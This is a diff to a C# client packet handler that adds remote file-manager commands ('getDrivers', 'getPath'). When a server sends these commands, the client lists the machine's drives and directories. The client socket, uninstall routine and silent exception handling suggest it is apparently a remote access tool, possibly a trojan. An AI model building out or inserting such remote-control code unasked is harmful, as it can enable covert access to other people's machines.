@@ -119,6 +119,28 @@ namespace Client.Handle_Packet
                             }
                         }
                         break;
+
+                    case "fileManager":
+                        {
+                            switch (unpack_msgpack.ForcePathObject("Command").AsString)
+                            {
+                                case "getDrivers":
+                                    {
+                                        FileManager fileManager = new FileManager();
+                                        fileManager.GetDrivers();
+                                    }
+                                    break;
+                                case "getPath":
+                                    {
+                                        FileManager fileManager = new FileManager();
+                                        fileManager.GetPath(unpack_msgpack.ForcePathObject("Path").AsString);
+                                    }
+                                    break;
+                            }
+
+
+                        }
+                        break;
                 }
             }
             catch { }
@@ -130,7 +152,7 @@ namespace Client.Handle_Packet
             msgpack.ForcePathObject("Packet").AsString = "Received";
             ClientSocket.BeginSend(msgpack.Encode2Bytes());
         }
-       
+
 
         private static void Uninstall()
         {
